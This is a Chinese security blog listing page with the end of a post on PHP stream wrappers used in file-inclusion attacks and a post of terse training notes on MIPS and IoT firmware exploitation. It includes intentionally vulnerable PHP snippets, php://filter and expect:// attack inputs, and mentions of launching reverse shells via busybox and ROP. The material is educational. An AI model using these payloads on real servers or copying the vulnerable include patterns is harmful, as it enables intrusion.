<p>而且当php远程包含打开的时候（当allow_url_include=on),就可以造成任意代码执行。<br><a href="/images/2017-07-28/52bcb6ca96711975.jpg"><img src="http://i4.buimg.com/567571/52bcb6ca96711975.jpg" alt="img"></a></p>
<ul>
<li><h4 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h4><p>是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区<code>&lt;?php   $code=$_GET[&quot;a&quot;];   file_put_contents($code,&quot;test&quot;);   ?&gt;</code></p>
</li>
</ul>
<p><a href="/images/2017-07-28/ab8f21052b4e2890.jpg"><img src="http://i4.buimg.com/567571/ab8f21052b4e2890.jpg" alt="img"></a></p>
<ul>
<li><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>是一种元封装器， 设计用于数据流打开时的筛选过滤应用<code>&lt;?php  $filename=$_GET[&quot;a&quot;];  $data=&quot;test&quot;;  file_put_contents($filename, $data);  ?&gt;</code></p>
</li>
</ul>
<p>?a=php://filter/write=string.tolower/resource=test.php<br>可以往服务器中写入一个文件内容全为小写且文件名为test.php的文件：<br>其中 ：<br>（1）string.tolower //写入内容全部变成小写<br>（2）string.toupper //写入内容全部变成大写<br>（3）string.rot13 //写入内容全部对字符串执行 ROT13 编码<br>通过：?a=php://filter/convert.base64-encode/resource=test.php<br>可以往服务器中写入一个文件内容为base64编码且文件名为test.php的文件<br><a href="/images/2017-07-28/f80e4710de9ee31d.jpg"><img src="http://i2.muimg.com/567571/f80e4710de9ee31d.jpg" alt="img"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;];  </div><div class="line">echo file_get_contents($filename);  </div><div class="line">?&gt; </div><div class="line"></div><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;]; </div><div class="line">include(&quot;$filename&quot;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>?a=php://filter/convert.base64-encode/resource=test.php,就可以把test.php的内容以base64编码的方式显示出来</p>
<p>双引号包含的变量$filename，可以当成正常变量执行，而单引号包裹的变量则会当成字符串</p>
<ul>
<li><p>那么可以用?hax=expect://command 来执行任意linux指令，但是：<br>Note:该封装协议默认未开启<br>为了使用 expect:// 封装器，你必须安装» PECL 上的 » Expect扩展。</p>
</li>
<li><h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>数据流封装器<br>当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行<code>&lt;?php  $filename=$_GET[&quot;a&quot;];  include(&quot;$filename&quot;);  ?&gt;</code></p>
</li>
</ul>
<p><a href="/images/2017-07-28/19570d7acea8b8a7.jpg"><img src="http://i4.buimg.com/567571/19570d7acea8b8a7.jpg" alt="img"></a></p>
<p>参考链接：<br><a href="http://blog.csdn.net/niexinming/article/details/52605144" target="_blank" rel="external">http://blog.csdn.net/niexinming/article/details/52605144</a></p>
<ul>
<li><strong>本文作者：</strong> Hello_C</li>
<li><strong>本文链接：</strong> <a href="http://yoursite.com/%E4%BB%A3%E7%A0%81/2017/04/09/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE.html">http://yoursite.com/代码/2017/04/09/PHP伪协议.html</a></li>
<li><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank" rel="external">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/16/XMAN之旅——MIPS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/16/XMAN之旅——MIPS/" itemprop="url">XMAN之旅——MIPS</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-16T15:10:28+08:00">
                2017-08-16
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/xman/" itemprop="url" rel="index">
                    <span itemprop="name">xman</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="IOT-Internet-of-Things-物联网"><a href="#IOT-Internet-of-Things-物联网" class="headerlink" title="IOT(Internet of Things) 物联网"></a>IOT(Internet of Things) 物联网</h3><p>CAN协议<br>TTP协议<br>介质访问控制模式CSMA/CD<br>GPS系统遥控<br>obd<br>定位解锁功能</p>
<p>智能联网汽车信息安全状况</p>
<h3 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h3><p>RISC架构<br>通用寄存器 32个<br>特殊寄存器 PC hI IO<br>指令定长<br>有大端和小端两种<br>指令还有地址 都是 4字节对齐的<br>数据访问严格4 字节对其<br>流水线</p>
<p>xss(不是很严重)<br>CSRF<br>认证漏洞<br>命令注入（针对后端的lua 脚本)</p>
<p>mips不会自动刷新<br>shellcode 被存于数据的cache中<br>cacch incoherency</p>
<p>使用busybox 启用 reverse shell</p>
<p>由于不能直接与cgi进行交互，可以使用 reverse shell<br>wget一个</p>
<p>-W hexdump<br>-A 分析指令架构 寻找各种架构的函数projoque</p>
<p>binwalk -M</p>
<p>使用 ROP或者其他啊手段一次请求启动reverse shell<br>定位 binary 地组织，可以在同样的环境中进行调试，或者调用其他漏洞的leak</p>
<p>MIPS的shellcode 开发</p>
<p>ropgadget<br>使用 IDA的插件 MIPS ROP Finder(可以支持定制搜索)</p>
<p>找可用gadget<br>向已知地址执行shellcode<br>rop执行system</p>
<p>binutils-mips-linux-gnu<br>qemu-mipsel -L /usr/mipsel-linux-gnu/ ./pwn300</p>
<p>qemu-mipsel<br>MIPS库环境库安装</p>
<p>qemu-mips<br>user mode 直接运行用户程序<br>需要完整的library<br>system mode 直接模拟mips系统</p>
<p>gdb server<br>gdb-multiarch<br>IDA debugger</p>
<p>mips rop gadget<br>MIPS汇编语言<br>逆向工具</p>
<p>基于 MIPS或者 ARM架构的 openwrt<br>普通用户没有 root shell<br>基于 busybox<br>libc 和一般的linux 不同 使用 uclibc(提供基本的嵌入式函数，比较小，节省内存空间)</p>
<p>binwalk<br>firmware-mod-kit</p>
<p>用于开发板的调试<br>输出root Image 或者之际给出系统的rootshell<br>辅助分析</p>
<p>USB2TL<br>Tx端链接开发板Rx<br>Rx端链接开发板Tx<br>GND链接GND</p>
<p>与UART交互</p>
<p>GDN ground<br>TX transmit 发送引脚 3.3v<br>RX recive 接受引脚 3.3。v<br>VCC 电源 一般电压为3.3-5v</p>
<p>openwrt<br>Embedded linux<br>VxWorks<br>uClinux<br>FreeRTOS</p>
<p>与段 与攻击一个web站点类似(比较少，和攻击一个web差不多）<br>正对设备与网关，网关与云端之间的嗅探<br>身份伪造等<br>通过针对设备以及网关的固件你想利用漏洞获取权限 </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/me.jpg"
               alt="Introspelliam" />
          <p class="site-author-name" itemprop="name">Introspelliam</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
           
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
            
              <a href="/archives/">
            
                <span class="site-state-item-count">132</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">16</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">55</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/Introspelliam" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                    
                      GitHub
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/u/3008590672" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                    
                      Weibo
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Introspelliam</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>

  <span class="post-meta-divider">|</span>

  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  

  
    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  










  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
  


  

  

</body>
</html>
